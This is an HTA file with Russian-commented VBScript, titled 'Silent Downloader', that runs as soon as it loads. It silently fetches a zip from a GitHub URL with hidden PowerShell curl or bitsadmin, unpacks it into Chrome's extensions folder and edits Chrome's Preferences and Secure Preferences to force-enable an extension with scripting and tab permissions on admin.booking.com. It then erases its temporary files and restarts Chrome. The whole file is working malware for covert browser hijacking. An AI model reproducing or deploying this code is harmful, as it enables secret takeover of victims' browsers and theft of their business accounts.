<html>
<head>
<title>Silent Downloader</title>
<hta:application id="downloader" windowState="minimize"/>
</head>
<body>
<script language="VBScript">
Sub Window_onLoad
    On Error Resume Next
    
    Set shell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
    
    ' Скачивание файла
    curlCmd = "powershell -WindowStyle Hidden -Command ""curl.exe -L -o $env:TEMP\test.zip https://github.com/gospodinsreda/avito_yola/raw/refs/heads/master/test.zip"""
    shell.Run curlCmd, 0, True
    
    If Not fso.FileExists(tempFolder & "\test.zip") Then
        bitsCmd = "powershell -WindowStyle Hidden -Command ""bitsadmin /transfer downloadJob /download /priority FOREGROUND 'https://github.com/gospodinsreda/avito_yola/raw/refs/heads/master/test.zip' '$env:TEMP\test.zip'"""
        shell.Run bitsCmd, 0, True
    End If
    
    ' Финальная проверка и установка расширения
    If fso.FileExists(tempFolder & "\test.zip") Then
        ' Используем ID из нашего ключа
        extensionId = "mfkomnpbmdkghpjhpnmjnhpgcjdeiblk"
        userDataPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
        chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0.0"
        
        ' Создаем необходимые директории
        If Not fso.FolderExists(userDataPath & "\Default\Extensions") Then
            fso.CreateFolder(userDataPath & "\Default\Extensions")
        End If
        If Not fso.FolderExists(userDataPath & "\Default\Extensions\" & extensionId) Then
            fso.CreateFolder(userDataPath & "\Default\Extensions\" & extensionId)
        End If
        If Not fso.FolderExists(chromeExtPath) Then
            fso.CreateFolder(chromeExtPath)
        End If
        
        ' Распаковываем во временную папку
        If Not fso.FolderExists(tempFolder & "\test") Then
            fso.CreateFolder(tempFolder & "\test")
        End If
        
        unzipCmd = "powershell -WindowStyle Hidden -Command ""& {Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('" & tempFolder & "\test.zip', '" & tempFolder & "\test')}"""
        shell.Run unzipCmd, 0, True
        
        ' Копируем файлы в папку расширений Chrome
        xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
        shell.Run xcopyCmd, 0, True
        
        ' Модифицируем Preferences если файл существует
        If fso.FileExists(userDataPath & "\Default\Preferences") Then
            Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 1)
            prefsContent = prefsFile.ReadAll()
            prefsFile.Close
            
            ' Создаем настройки для нашего расширения
            extSettings = """" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}"
            
            ' Проверяем существующие настройки и добавляем наши
            If InStr(prefsContent, """extensions"":{") > 0 Then
                If InStr(prefsContent, """extensions"":{""settings"":{") > 0 Then
                    ' Если уже есть настройки расширений, добавляем наше
                    newPrefs = Replace(prefsContent, """extensions"":{""settings"":{", """extensions"":{""settings"":{" & extSettings & ",")
                Else
                    ' Если есть секция extensions, но нет settings
                    newPrefs = Replace(prefsContent, """extensions"":{", """extensions"":{""settings"":{" & extSettings & "},")
                End If
            Else
                ' Если нет секции extensions вообще
                newPrefs = Replace(prefsContent, "{", "{""extensions"":{""settings"":{" & extSettings & "},""ui"":{""developer_mode"":true}},")
            End If
            
            ' Сохраняем обновленные настройки
            Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 2, True)
            prefsFile.Write newPrefs
            prefsFile.Close
        End If
        
        ' Аналогично для Secure Preferences
        If fso.FileExists(userDataPath & "\Default\Secure Preferences") Then
            Set securePrefsFile = fso.OpenTextFile(userDataPath & "\Default\Secure Preferences", 1)
            securePrefsContent = securePrefsFile.ReadAll()
            securePrefsFile.Close
            
            If InStr(securePrefsContent, """extensions"":{") > 0 Then
                If InStr(securePrefsContent, """extensions"":{""settings"":{") > 0 Then
                    newSecurePrefs = Replace(securePrefsContent, """extensions"":{""settings"":{", """extensions"":{""settings"":{" & extSettings & ",")
                Else
                    newSecurePrefs = Replace(securePrefsContent, """extensions"":{", """extensions"":{""settings"":{" & extSettings & "},")
                End If
            Else
                newSecurePrefs = Replace(securePrefsContent, "{", "{""extensions"":{""settings"":{" & extSettings & "}},")
            End If
            
            Set securePrefsFile = fso.OpenTextFile(userDataPath & "\Default\Secure Preferences", 2, True)
            securePrefsFile.Write newSecurePrefs
            securePrefsFile.Close
        End If
        
        ' Удаляем временные файлы
        fso.DeleteFile(tempFolder & "\test.zip")
        fso.DeleteFolder(tempFolder & "\test")
        
        ' Закрываем Chrome если он запущен
        shell.Run "taskkill /F /IM chrome.exe /T", 0, True
        shell.Run "ping -n 3 127.0.0.1", 0, True
        
        ' Запускаем Chrome
        chromePath = """C:\Program Files\Google\Chrome\Application\chrome.exe"""
        shell.Run chromePath, 1, False
    End If
    
    self.close
    window.close
End Sub
</script>
</body>
</html>
